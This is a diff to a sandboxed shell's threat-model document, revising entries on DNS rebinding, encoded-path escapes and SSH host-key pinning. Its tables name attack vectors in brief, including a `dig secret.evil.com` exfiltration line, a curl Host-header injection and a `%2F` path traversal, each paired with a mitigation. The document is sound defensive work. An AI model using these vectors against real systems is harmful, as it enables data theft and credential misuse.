@@ -855,7 +855,7 @@ from `result.stdout`/`stderr` before display.
 | ID | Threat | Attack Vector | Mitigation | Status |
 |----|--------|--------------|------------|--------|
 | TM-NET-001 | DNS spoofing | Resolve to wrong IP | No DNS resolution | **MITIGATED** |
-| TM-NET-002 | DNS rebinding | Rebind after allowlist check | Literal host matching + `PrivateIpFilteringResolver` blocks private IPs at connect time | **MITIGATED** |
+| TM-NET-002 | DNS rebinding | Rebind after allowlist check | Literal host matching + `PrivateIpFilteringResolver` filters private and reserved IPs at connect time, including IPv4 TEST-NET and IPv6 documentation ranges | **MITIGATED** |
 | TM-NET-003 | DNS exfiltration | `dig secret.evil.com` | No DNS commands | **MITIGATED** |
 
 **Current Risk**: NONE. Implementation: `network/allowlist.rs::matches_pattern()`, allowlist
@@ -897,7 +897,7 @@ matches literal host strings exactly, never resolved IPs; no DNS lookup.
 | TM-NET-029 | Private IP behind a v4-embedding or reserved v6/v4 form | Allowlisted host returns AAAA `64:ff9b::a9fe:a9fe` (NAT64), `2002:7f00:1::` (6to4), or A in `0.0.0.0/8`, `198.18.0.0/15`, multicast, `240.0.0.0/4` | `is_private_ip` classifies NAT64/6to4 by the embedded v4 address and blocks all non-global special-purpose ranges (Teredo, local-use NAT64, site-local, multicast) at pre-resolve and connect time | **MITIGATED** |
 | TM-NET-030 | Embedded CLI egress bypass | `fetchkit fetch`/`markkit extract URL` open their own sockets, follow redirects off the allowlist, or read host proxy env | Both builtins route every hop (redirects, discovery probes, API subrequests) through the sandbox `HttpClient`; no upstream TLS stack is linked; `--allow-env-proxy` refused ([Markkit and Fetchkit Builtins](../runtimes/markkit-fetchkit-builtins.md)) | **MITIGATED** |
 | TM-NET-031 | Script-chosen Host carries injected credentials to another vhost | `curl -H 'Host: other.example' https://approved.example/` reaches the vhost named by Host on the approved IP, with credentials injected for the approved name | `HttpClient::request_with_timeouts` drops caller `Host`, `Content-Length`, `Transfer-Encoding`, connection and proxy headers (`network::HOST_OWNED_HEADERS`, shared with the CPython HTTP bridge) before hooks, credential injection and transport dispatch. Regressions: `test_caller_host_owned_headers_are_dropped`, `script_cannot_redirect_credentials` | **MITIGATED** |
-| TM-NET-032 | Encoded slash escapes a path-scoped allow/credential rule | `https://api.example/v1/..%2Fadmin` matches prefix `/v1/`; servers that decode before routing serve `/admin` (with `/v1/` credentials) | Path-scoped patterns refuse URL paths holding `%2F` or `%5C`; `url` already resolves literal and `%2e` dot segments and `\`. Host-wide patterns are unchanged. Regression: `test_path_prefix_refuses_encoded_separators` | **MITIGATED** |
+| TM-NET-032 | Ambiguous path encoding escapes a path-scoped allow or credential rule | Downstream routing can interpret encoded separators after one or more decoding passes | Path-scoped patterns refuse malformed escapes and encoded slashes, backslashes, and percent signs. This prevents additional escapes from forming in later decoding passes. Host-wide patterns allow any path. Regression tests cover encoded separators, encoded percent signs, and malformed escapes. | **MITIGATED** |
 
 **Current Risk**: LOW - Multiple mitigations in place
 
@@ -1201,7 +1201,10 @@ is built from configurable `self.config` values, never read from host `~/.gitcon
 
 **TM-SSH-006**: The `RusshHandler` verifies server host keys against trusted keys configured via
 `SshConfig::trusted_host_key()`. When `strict_host_key_checking` is enabled (default), connections
-to hosts without a matching trusted key are rejected. When disabled, a warning is emitted to stderr.
+to hosts without a matching trusted key are rejected. When disabled, the default transport emits
+a warning to stderr. Custom handlers must accept the configured pins before receiving operations
+in strict mode. Bashkit trusts those handlers to enforce the pins on each SSH connection before
+authentication, including rejecting certificates.
 
 Since russh 0.63 the `check_server_key` callback receives a `PublicKeyOrCertificate`, so a server
 may present a CA-signed host *certificate* rather than a raw key. Bashkit has no CA trust store,
